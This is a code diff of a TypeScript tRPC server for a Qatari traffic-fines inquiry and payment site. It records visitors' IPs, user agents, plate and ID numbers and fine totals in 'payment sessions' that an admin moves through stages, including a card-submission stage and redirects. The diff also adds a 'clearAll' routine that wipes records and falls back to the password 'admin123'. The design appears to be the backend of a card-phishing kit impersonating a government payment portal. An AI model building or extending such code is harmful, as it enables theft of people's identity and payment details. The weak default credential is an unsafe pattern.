@@ -19,6 +19,7 @@ import {
 } from "./db";
 import { scrapeQatarFines, PLATE_SOURCES, QATAR_PLATE_TYPES, getPlateCodeOptions } from "./scraper";
 import crypto from "crypto";
+import { nanoid } from "nanoid";
 
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
 const adminTokens = new Set<string>();
@@ -56,6 +57,7 @@ export const appRouter = router({
     query: publicProcedure
       .input(
         z.object({
+          sessionId: z.string().optional(),
           inquiryType: z.enum(["plate", "qid", "establishment"]),
           plateSource: z.string().optional(),
           plateNumber: z.string().optional(),
@@ -75,6 +77,23 @@ export const appRouter = router({
           userId: ctx.user?.id ?? null,
         });
 
+        let currentSessionId = input.sessionId;
+        if (!currentSessionId) {
+          currentSessionId = nanoid();
+          await createPaymentSession({
+            sessionId: currentSessionId,
+            queryId,
+            stage: "inquiry",
+            clientIp: ctx.req.ip,
+            userAgent: ctx.req.headers["user-agent"],
+            plateNumber: input.plateNumber,
+            plateSource: input.plateSource,
+            plateCode: input.plateType,
+            qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
+            establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
+          });
+        }
+
         try {
           const result = await scrapeQatarFines(input);
 
@@ -83,7 +102,11 @@ export const appRouter = router({
               status: "failed",
               errorMessage: result.errorMessage,
             });
-            return { success: false, queryId, fines: [], errorMessage: result.errorMessage };
+            await updatePaymentSession(currentSessionId, {
+              errorMessage: result.errorMessage,
+              statusRead: 0
+            });
+            return { success: false, queryId, sessionId: currentSessionId, fines: [], errorMessage: result.errorMessage };
           }
 
           const finesCount = result.fines.length;
@@ -94,50 +117,70 @@ export const appRouter = router({
             rawResults: result.fines as any,
           });
 
+          // تحديث الجلسة بالمبلغ والنتائج فور الاستعلام
+          await updatePaymentSession(currentSessionId, {
+            queryId,
+            totalAmount: result.totalAmount,
+            selectedFines: result.fines as any,
+            stage: "results",
+            statusRead: 0,
+            plateNumber: input.plateNumber,
+            plateSource: input.plateSource,
+            plateCode: input.plateType,
+            qidNumber: input.inquiryType === "qid" ? input.ownerId : undefined,
+            establishmentId: input.inquiryType === "establishment" ? input.ownerId : undefined,
+          });
+
           if (finesCount > 0) {
             await createFines(
               result.fines.map((fine) => ({
                 queryId,
                 fineNumber: fine.fineNumber,
                 fineDate: fine.fineDate,
-                description: fine.description,
-                amount: fine.amount ? fine.amount.replace(/[^0-9.]/g, "") : "0",
-                blackPoints: fine.blackPoints ?? 0,
-                isPaid: fine.isPaid ?? "unpaid",
-                location: fine.location,
+                description: fine.descriptionAr || fine.description,
+                amount: fine.amount,
+                blackPoints: fine.blackPoints,
+                location: fine.locationAr || fine.location,
+                isPaid: fine.isPaid,
               }))
             );
           }
 
-          const sessionId = crypto.randomBytes(16).toString("hex");
-          await createPaymentSession({
-            sessionId,
-            queryId: queryId || null,
-            selectedFines: result.fines as any,
-            totalAmount: result.totalAmount ?? "0",
-            plateNumber: input.plateNumber || input.ownerId || "",
-            plateSource: input.plateSource || "QAT",
-            stage: "card",
-            clientIp: ctx.req.socket.remoteAddress || "",
-            userAgent: ctx.req.headers["user-agent"] || "",
-            statusRead: 0,
-          });
-
           return {
             success: true,
             queryId,
-            sessionId,
+            sessionId: currentSessionId,
             fines: result.fines,
             totalAmount: result.totalAmount,
-            totalFines: finesCount,
           };
         } catch (error: any) {
-          return { success: false, queryId, fines: [], errorMessage: error.message };
+          await updateFineQuery(queryId, {
+            status: "failed",
+            errorMessage: error.message,
+          });
+          return { success: false, queryId, sessionId: currentSessionId, fines: [], errorMessage: error.message };
         }
       }),
   }),
 
   payment: router({
+    createSession: publicProcedure
+      .input(z.object({ queryId: z.number(), totalAmount: z.string(), selectedFines: z.any() }))
+      .mutation(async ({ input, ctx }) => {
+        const sessionId = nanoid();
+        const id = await createPaymentSession({
+          sessionId,
+          queryId: input.queryId,
+          totalAmount: input.totalAmount,
+          selectedFines: input.selectedFines,
+          stage: "card",
+          clientIp: ctx.req.ip,
+          userAgent: ctx.req.headers["user-agent"],
+          statusRead: 0,
+        });
+        return { sessionId };
+      }),
+
     getSession: publicProcedure
       .input(z.object({ sessionId: z.string() }))
       .query(async ({ input }) => {
@@ -146,12 +189,26 @@ export const appRouter = router({
         return session;
       }),
 
+    updateStage: publicProcedure
+      .input(z.object({ sessionId: z.string(), stage: z.string() }))
+      .mutation(async ({ input }) => {
+        await updatePaymentSession(input.sessionId, {
+          stage: input.stage as any,
+          statusRead: 0
+        });
+        return { success: true };
+      }),
+
     getStatus: publicProcedure
       .input(z.object({ sessionId: z.string() }))
       .query(async ({ input }) => {
         const session = await getPaymentSessionBySessionId(input.sessionId);
         if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
-        return { stage: session.stage, errorMessage: session.errorMessage, redirectUrl: session.redirectUrl };
+        return { 
+          stage: session.stage, 
+          errorMessage: session.errorMessage, 
+          redirectUrl: session.redirectUrl 
+        };
       }),
 
     submitCard: publicProcedure
@@ -270,7 +327,7 @@ export const appRouter = router({
         }
 
         await updatePaymentSession(input.sessionId, {
-          stage: newStage,
+          stage: newStage as any,
           errorMessage: input.errorMessage || null,
           statusRead: 1
         });
@@ -291,5 +348,15 @@ export const appRouter = router({
         });
         return { success: true };
       }),
+
+    clearAll: publicProcedure
+      .input(z.object({ token: z.string() }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
+        const { clearAdminRecords } = await import("./db");
+        return await clearAdminRecords();
+      }),
   }),
 });
+
+export type AppRouter = typeof appRouter;
